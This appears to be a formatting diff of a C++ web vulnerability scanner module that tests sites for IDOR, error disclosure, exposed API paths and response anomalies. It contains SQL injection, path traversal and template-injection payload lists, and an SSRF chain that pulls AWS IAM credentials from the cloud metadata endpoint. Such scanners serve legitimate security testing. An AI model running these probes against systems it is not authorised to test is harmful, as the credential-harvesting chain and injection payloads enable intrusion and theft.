@@ -2,33 +2,28 @@
 /// @brief Elite detection: response fingerprinting, tech-adaptive payloads,
 ///        IDOR enumeration, error harvesting, exploit chains, scope expansion,
 ///        anomaly detection.
-#include "scanner_base.hpp"
 #include <set>
+
+#include "scanner_base.hpp"
 
 namespace apex {
 namespace {
 
 /// IDOR scanner — enumerate sequential/predictable IDs.
-std::vector<Finding> scan_idor(const Config &, HttpClient &http,
-                               const CrawlResult &crawl) {
+std::vector<Finding> scan_idor(const Config&, HttpClient& http, const CrawlResult& crawl) {
   std::vector<Finding> findings;
-  for (const auto &url : crawl.urls) {
-    for (const auto &p : crawl.params) {
+  for (const auto& url : crawl.urls) {
+    for (const auto& p : crawl.params) {
       if (p.url != url) continue;
       // Check if param value looks numeric.
-      bool numeric = !p.name.empty() &&
-                     (p.name.find("id") != std::string::npos ||
-                      p.name.find("user") != std::string::npos ||
-                      p.name.find("account") != std::string::npos);
+      bool numeric = !p.name.empty() && (p.name.find("id") != std::string::npos || p.name.find("user") != std::string::npos ||
+                                         p.name.find("account") != std::string::npos);
       if (!numeric) continue;
 
       auto resp1 = http.get(p.url + "?" + p.name + "=1");
       auto resp2 = http.get(p.url + "?" + p.name + "=2");
-      if (resp1.status_code == 200 && resp2.status_code == 200 &&
-          resp1.body != resp2.body && !resp1.body.empty()) {
-        findings.push_back({"IDOR", "high", url,
-                            "Sequential ID enumeration possible", p.name,
-                            "1,2", ""});
+      if (resp1.status_code == 200 && resp2.status_code == 200 && resp1.body != resp2.body && !resp1.body.empty()) {
+        findings.push_back({"IDOR", "high", url, "Sequential ID enumeration possible", p.name, "1,2", ""});
       }
     }
   }
@@ -36,56 +31,48 @@ std::vector<Finding> scan_idor(const Config &, HttpClient &http,
 }
 
 /// Error harvesting — trigger errors to reveal internal info.
-std::vector<Finding> scan_error_harvest(const Config &, HttpClient &http,
-                                        const CrawlResult &crawl) {
+std::vector<Finding> scan_error_harvest(const Config&, HttpClient& http, const CrawlResult& crawl) {
   std::vector<Finding> findings;
-  const std::vector<std::string> triggers = {
-      "[]", "{}", "null", "undefined", "-1", "99999999",
-      "' OR ''='", "../../../", "%00", "{{", "${}"};
-  const std::vector<std::string> error_sigs = {
-      "stack trace", "Traceback", "Exception", "at line",
-      "Fatal error", "Warning:", "Debug:", "Internal Server Error",
-      "NullPointerException", "TypeError"};
+  const std::vector<std::string> triggers = {"[]",        "{}",        "null", "undefined", "-1", "99999999",
+                                             "' OR ''='", "../../../", "%00",  "{{",        "${}"};
+  const std::vector<std::string> error_sigs = {"stack trace",          "Traceback", "Exception", "at line",
+                                               "Fatal error",          "Warning:",  "Debug:",    "Internal Server Error",
+                                               "NullPointerException", "TypeError"};
 
-  for (const auto &url : crawl.urls) {
+  for (const auto& url : crawl.urls) {
     auto targets = get_targets(crawl, url);
-    for (const auto &[base, param] : targets) {
-      for (const auto &trigger : triggers) {
+    for (const auto& [base, param] : targets) {
+      for (const auto& trigger : triggers) {
         auto resp = http.get(base + trigger);
-        for (const auto &sig : error_sigs) {
+        for (const auto& sig : error_sigs) {
           if (resp.body.find(sig) != std::string::npos) {
-            findings.push_back({"Error Disclosure", "medium", url,
-                                "Error leaked: " + sig, param, trigger, ""});
+            findings.push_back({"Error Disclosure", "medium", url, "Error leaked: " + sig, param, trigger, ""});
             goto next_param;
           }
         }
       }
-      next_param:;
+    next_param:;
     }
   }
   return findings;
 }
 
 /// Exploit chain: SSRF → AWS credentials.
-std::vector<Finding> scan_exploit_chain_ssrf(const Config &, HttpClient &http,
-                                             const CrawlResult &crawl) {
+std::vector<Finding> scan_exploit_chain_ssrf(const Config&, HttpClient& http, const CrawlResult& crawl) {
   std::vector<Finding> findings;
-  const std::string meta_url =
-      "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
+  const std::string meta_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
 
-  for (const auto &url : crawl.urls) {
+  for (const auto& url : crawl.urls) {
     auto targets = get_targets(crawl, url, "url");
-    for (const auto &[base, param] : targets) {
+    for (const auto& [base, param] : targets) {
       auto resp = http.get(base + meta_url);
-      if (resp.status_code == 200 && !resp.body.empty() &&
-          resp.body.find("<") == std::string::npos) {
+      if (resp.status_code == 200 && !resp.body.empty() && resp.body.find("<") == std::string::npos) {
         // Got a role name, try to get credentials.
         std::string role = resp.body.substr(0, resp.body.find('\n'));
         auto creds = http.get(base + meta_url + role);
         if (creds.body.find("AccessKeyId") != std::string::npos) {
-          findings.push_back({"Exploit Chain", "critical", url,
-                              "SSRF → AWS IAM credentials via " + role,
-                              param, meta_url + role, "AccessKeyId found"});
+          findings.push_back(
+              {"Exploit Chain", "critical", url, "SSRF → AWS IAM credentials via " + role, param, meta_url + role, "AccessKeyId found"});
         }
       }
     }
@@ -94,47 +81,37 @@ std::vector<Finding> scan_exploit_chain_ssrf(const Config &, HttpClient &http,
 }
 
 /// Scope expansion — discover related endpoints.
-std::vector<Finding> scan_scope_expansion(const Config &, HttpClient &http,
-                                          const CrawlResult &crawl) {
+std::vector<Finding> scan_scope_expansion(const Config&, HttpClient& http, const CrawlResult& crawl) {
   std::vector<Finding> findings;
   if (crawl.urls.empty()) return findings;
   std::string base = base_url_from(crawl.urls[0]);
 
-  const std::vector<std::string> api_paths = {
-      "/api/", "/api/v1/", "/api/v2/", "/graphql", "/rest/",
-      "/internal/", "/admin/api/", "/debug/", "/_debug/"};
+  const std::vector<std::string> api_paths = {"/api/",      "/api/v1/",    "/api/v2/", "/graphql", "/rest/",
+                                              "/internal/", "/admin/api/", "/debug/",  "/_debug/"};
 
-  for (const auto &path : api_paths) {
+  for (const auto& path : api_paths) {
     auto resp = http.get(base + path);
-    if (resp.status_code == 200 || resp.status_code == 401 ||
-        resp.status_code == 403) {
-      findings.push_back({"Scope Expansion", "info", base + path,
-                          "API endpoint found (HTTP " +
-                              std::to_string(resp.status_code) + ")",
-                          "", "", ""});
+    if (resp.status_code == 200 || resp.status_code == 401 || resp.status_code == 403) {
+      findings.push_back(
+          {"Scope Expansion", "info", base + path, "API endpoint found (HTTP " + std::to_string(resp.status_code) + ")", "", "", ""});
     }
   }
   return findings;
 }
 
 /// Anomaly detection — find responses that differ from baseline.
-std::vector<Finding> scan_anomaly(const Config &, HttpClient &http,
-                                  const CrawlResult &crawl) {
+std::vector<Finding> scan_anomaly(const Config&, HttpClient& http, const CrawlResult& crawl) {
   std::vector<Finding> findings;
-  for (const auto &url : crawl.urls) {
+  for (const auto& url : crawl.urls) {
     auto targets = get_targets(crawl, url);
-    for (const auto &[base, param] : targets) {
+    for (const auto& [base, param] : targets) {
       auto baseline = http.get(base + "normal");
-      const std::vector<std::string> probes = {
-          "admin", "root", "null", "true", "false", "0", "-1"};
-      for (const auto &probe : probes) {
+      const std::vector<std::string> probes = {"admin", "root", "null", "true", "false", "0", "-1"};
+      for (const auto& probe : probes) {
         auto resp = http.get(base + probe);
-        if (resp.status_code != baseline.status_code &&
-            resp.status_code != 404) {
-          findings.push_back({"Anomaly", "low", url,
-                              "Status anomaly: " + probe + " → HTTP " +
-                                  std::to_string(resp.status_code),
-                              param, probe, ""});
+        if (resp.status_code != baseline.status_code && resp.status_code != 404) {
+          findings.push_back(
+              {"Anomaly", "low", url, "Status anomaly: " + probe + " → HTTP " + std::to_string(resp.status_code), param, probe, ""});
         }
       }
     }
@@ -143,8 +120,7 @@ std::vector<Finding> scan_anomaly(const Config &, HttpClient &http,
 }
 
 /// Tech-adaptive payloads — detect tech stack and use targeted payloads.
-std::vector<Finding> scan_tech_adaptive(const Config &, HttpClient &http,
-                                        const CrawlResult &crawl) {
+std::vector<Finding> scan_tech_adaptive(const Config&, HttpClient& http, const CrawlResult& crawl) {
   std::vector<Finding> findings;
   if (crawl.urls.empty()) return findings;
   std::string base = base_url_from(crawl.urls[0]);
@@ -152,10 +128,10 @@ std::vector<Finding> scan_tech_adaptive(const Config &, HttpClient &http,
 
   // Detect tech and choose payloads.
   struct TechPayload {
-    const char *detect;
-    const char *type;
-    const char *payload;
-    const char *evidence;
+    const char* detect;
+    const char* type;
+    const char* payload;
+    const char* evidence;
   };
   const TechPayload tech_payloads[] = {
       {"PHP", "SQLi", "' UNION SELECT null,version()--", "MariaDB"},
@@ -166,23 +142,24 @@ std::vector<Finding> scan_tech_adaptive(const Config &, HttpClient &http,
       {"Laravel", "SQLi", "' UNION SELECT null,database()--", "information_schema"},
   };
 
-  for (const auto &tp : tech_payloads) {
+  for (const auto& tp : tech_payloads) {
     bool detected = resp.body.find(tp.detect) != std::string::npos;
     if (!detected) {
-      for (const auto &[h, v] : resp.headers) {
-        if (v.find(tp.detect) != std::string::npos) { detected = true; break; }
+      for (const auto& [h, v] : resp.headers) {
+        if (v.find(tp.detect) != std::string::npos) {
+          detected = true;
+          break;
+        }
       }
     }
     if (!detected) continue;
 
-    for (const auto &url : crawl.urls) {
+    for (const auto& url : crawl.urls) {
       auto targets = get_targets(crawl, url);
-      for (const auto &[tbase, param] : targets) {
+      for (const auto& [tbase, param] : targets) {
         auto test = http.get(tbase + std::string(tp.payload));
         if (test.body.find(tp.evidence) != std::string::npos) {
-          findings.push_back({tp.type, "high", url,
-                              std::string("Tech-adaptive: ") + tp.detect,
-                              param, tp.payload, tp.evidence});
+          findings.push_back({tp.type, "high", url, std::string("Tech-adaptive: ") + tp.detect, param, tp.payload, tp.evidence});
         }
       }
     }
@@ -190,7 +167,7 @@ std::vector<Finding> scan_tech_adaptive(const Config &, HttpClient &http,
   return findings;
 }
 
-} // namespace
+}  // namespace
 
 std::vector<Scanner> register_elite_scanners() {
   return {
@@ -203,4 +180,4 @@ std::vector<Scanner> register_elite_scanners() {
   };
 }
 
-} // namespace apex
+}  // namespace apex
